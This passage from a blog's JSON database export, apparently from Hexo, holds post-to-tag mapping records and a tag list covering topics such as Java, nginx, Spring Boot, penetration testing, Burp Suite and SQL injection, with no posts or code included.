6cvp305u96fe","_id":"cjr64052g001r6cvpgjxdg9ld"},{"post_id":"cjr64051u00136cvphm6eaktu","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64052g001s6cvpqshim75e"},{"post_id":"cjr640522001c6cvpuj0b2881","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64052h001u6cvpbi9llp3l"},{"post_id":"cjr64051y00186cvpmyb2unnx","tag_id":"cjr6404zs000e6cvprsyn5jmk","_id":"cjr64052h001v6cvpdmwr9r0i"},{"post_id":"cjr64051y00186cvpmyb2unnx","tag_id":"cjr640523001d6cvpjz1xjait","_id":"cjr64052i001x6cvp6mqwta2j"},{"post_id":"cjr640526001h6cvpkz4guylk","tag_id":"cjr64052a001k6cvpbfpyhka0","_id":"cjr64052i001y6cvph60eu5kb"},{"post_id":"cjr64052b001m6cvpcaf434u9","tag_id":"cjr64052f001q6cvpz9z5pnxg","_id":"cjr64052i001z6cvp3abb946f"},{"post_id":"cjr64052b001m6cvpcaf434u9","tag_id":"cjr64052g001t6cvp1k3v7ylg","_id":"cjr64052j00206cvpjoki1zxp"},{"post_id":"cjr64052d001o6cvpza2tchry","tag_id":"cjr64052h001w6cvpxb4bju0j","_id":"cjr64052j00216cvpxjjqmqqh"},{"post_id":"cjr64053100226cvpa6lyn9tp","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr64053400246cvpaynjtwt1"},{"post_id":"cjr64053300236cvpx9bbc4m7","tag_id":"cjr64051e000o6cvp8zvgasic","_id":"cjr64053500256cvpqwodxgki"},{"post_id":"cjr64053k00266cvpctzc4b5a","tag_id":"cjr64052f001q6cvpz9z5pnxg","_id":"cjr64053n00286cvpw6765tkt"},{"post_id":"cjr64053m00276cvpakzc22bv","tag_id":"cjr64053q002a6cvpf5aeo4bp","_id":"cjr64053s002c6cvphbw62jaw"},{"post_id":"cjr64053o00296cvpwa7ej3m6","tag_id":"cjr64053q002a6cvpf5aeo4bp","_id":"cjr64053t002d6cvpr7xn4ko9"},{"post_id":"cjr640546002e6cvpnrtj42hy","tag_id":"cjr640548002f6cvpbe1tp6uk","_id":"cjr640548002g6cvpncyj5s11"},{"post_id":"cjr64054c002h6cvpnjr5zg2q","tag_id":"cjr640548002f6cvpbe1tp6uk","_id":"cjr64054d002i6cvpy0kv3t8g"}],"Tag":[{"name":"linux","_id":"cjr6404ze00026cvpftouqvnh"},{"name":"socket","_id":"cjr6404zk00066cvpd4139ffr"},{"name":"正则","_id":"cjr6404zq000a6cvpuxvjttls"},{"name":"sgip","_id":"cjr6404zr000c6cvphfegl66o"},{"name":"java","_id":"cjr6404zs000e6cvprsyn5jmk"},{"name":"hexo","_id":"cjr6404zt000f6cvp1y3023em"},{"name":"nginx","_id":"cjr64050e000k6cvpvxgivf79"},{"name":"springboot","_id":"cjr64051e000o6cvp8zvgasic"},{"name":"tomcat","_id":"cjr64051y00166cvp305u96fe"},{"name":"spring","_id":"cjr640523001d6cvpjz1xjait"},{"name":"tools","_id":"cjr64052a001k6cvpbfpyhka0"},{"name":"渗透","_id":"cjr64052f001q6cvpz9z5pnxg"},{"name":"google","_id":"cjr64052g001t6cvp1k3v7ylg"},{"name":"burpsuite","_id":"cjr64052h001w6cvpxb4bju0j"},{"name":"wheels","_id":"cjr64053q002a6cvpf5aeo4bp"},{"name":"sql注入","_id":"cjr640548002f6cvpbe1tp6uk"}]}}